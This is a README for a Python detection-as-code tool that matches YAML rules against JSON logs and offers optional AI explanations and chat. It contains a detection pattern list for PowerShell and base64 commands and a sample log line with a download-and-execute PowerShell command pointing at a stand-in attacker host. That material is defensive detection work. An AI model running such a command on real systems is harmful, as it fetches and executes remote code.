# Detection-as-Code

Run security detection rules against log data and raise alerts. Treat rules as code: store them in Git, version them, and extend with RAG for AI-generated explanations and Q&A.

## Features

- **Rule-based detection** — YAML rules define patterns; the engine matches them against JSON logs and raises alerts.
- **RAG explanations** — Optional AI-generated explanation for each alert (why it fired, why it’s dangerous, what to do).
- **Conversational Q&A** — After alerts, ask questions about the run (e.g. “Why did alert 1 trigger?”) and get answers from the knowledge base and rules.

## Requirements

- Python 3.10+
- Dependencies in `requirements.txt`: PyYAML, sentence-transformers, ChromaDB, Hugging Face Hub, python-dotenv

## Install

```bash
git clone <your-repo>
cd DetectionAsCode
pip install -r requirements.txt
```

## Quick start

**1. Run detection (rules vs logs, no AI):**

```bash
python main.py --rules rules --logs logs/sample.json
```

You’ll see alerts with Rule ID, Severity, Timestamp, Source, and Message.

**2. Add AI explanations per alert:**

```bash
python main.py --rules rules --logs logs/sample.json --explain
```

Requires a Hugging Face token with **Inference** (or **Inference Providers**) permission — see [Configuration](#configuration).

**3. Add conversational Q&A after alerts:**

```bash
python main.py --rules rules --logs logs/sample.json --explain --chat
```

After the alert list, type questions (e.g. “Why did alert 1 trigger?”, “What damage can this command cause?”) and type `exit` or `quit` to stop.

### Command options

| Option      | Required | Description |
|------------|----------|-------------|
| `--rules`  | Yes      | Path to a rule file (e.g. `rules/suspicious-command.yaml`) or folder (e.g. `rules`). |
| `--logs`   | Yes      | Path to a JSON log file (e.g. `logs/sample.json`). |
| `--explain`| No       | Add an AI-generated explanation for each alert. |
| `--chat`   | No       | After alerts, start a Q&A session; type `exit` or `quit` to end. |

Run from the project root. For `--explain` or `--chat`, copy `.env.example` to `.env` and set `HF_TOKEN` (see [Configuration](#configuration)).

## Configuration

Create a `.env` file in the project root (copy from `.env.example`). Do not commit `.env` (it’s in `.gitignore`).

| Variable       | Required for RAG | Description |
|----------------|------------------|-------------|
| `HF_TOKEN`     | Yes              | Hugging Face token. Create at [huggingface.co/settings/tokens](https://huggingface.co/settings/tokens) with **Inference** or **Make calls to Inference Providers** enabled. |
| `RAG_HF_MODEL` | No               | Model for explanations/chat. Default uses a free model with `:cheapest` routing. Override if needed (e.g. `Qwen/Qwen2.5-7B-Instruct:cheapest`). |

RAG uses the [Hugging Face Inference Providers](https://huggingface.co/docs/api-inference) router; free monthly credits apply when the token has the right permission.

## Project structure

```
DetectionAsCode/
├── main.py              # CLI entry: --rules, --logs, --explain, --chat
├── requirements.txt
├── .env.example          # Template for .env (HF_TOKEN, optional RAG_HF_MODEL)
├── engine/              # Detection engine
│   ├── load_rules.py    # Load YAML rules from a file or directory
│   ├── load_logs.py    # Load JSON log file
│   ├── match.py        # Match one rule vs one log entry
│   └── run.py          # Run all rules vs all logs → alerts
├── rules/               # Detection rules (one YAML file per rule)
│   ├── suspicious-command.yaml
│   ├── reverse-shell.yaml
│   ├── persistence.yaml
│   └── ...
├── logs/                 # Sample or real log files (JSON)
│   └── sample.json
├── knowledge/            # RAG knowledge base
│   └── security_kb.md   # Security patterns and why they’re dangerous
├── rag/                  # RAG for explanations and Q&A
│   ├── index_builder.py # Build index from KB, rules, logs, docs
│   └── explain.py       # explain_alert(), answer_question(), Hugging Face API
└── docs/
    ├── shapes.md        # Rule and log shape reference
    └── rag.md           # RAG usage and HF setup
```

## Rules

Rules live under `rules/` as YAML files. Each file defines one detection.

**Required fields:** `id`, `condition`  
**Optional:** `enabled`, `name`, `description`, `severity` (default `medium`)

**Condition type `log_match`:** Check one log field for any of a list of patterns (substring match).

Example:

```yaml
id: suspicious-command-001
name: "Suspicious command in log"
description: "Alert when log message contains high-risk command patterns"
severity: high
enabled: true

condition:
  type: log_match
  field: message
  patterns:
    - "Invoke-Expression"
    - "IEX"
    - "base64 -d"
```

See `docs/shapes.md` for the full rule and log shape reference.

## Logs

Logs are JSON: an array of objects. Each object is one event. The engine uses the field given in the rule’s `condition.field` (usually `message`) for pattern matching. Common fields: `timestamp`, `source`, `message`.

Example entry:

```json
{
  "timestamp": "2025-03-04T09:30:00Z",
  "source": "audit",
  "message": "user=admin cmd=powershell -Enc IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
}
```

## RAG (explain & chat)

- **Index:** Built from `knowledge/security_kb.md`, rule contents, log paths, and docs (e.g. `docs/shapes.md`). Used for retrieval in both explain and chat.
- **--explain:** For each alert, the app retrieves relevant chunks and calls the LLM to produce a short explanation (what the pattern does, why it’s dangerous, what to do).
- **--chat:** After alerts, you can ask free-form questions; the same index and LLM are used to answer in the context of the current alerts and knowledge base.

LLM: Hugging Face Inference Providers (router). Set `HF_TOKEN` in `.env` for AI explanations and chat.

## License

Use and adapt as needed for your environment.
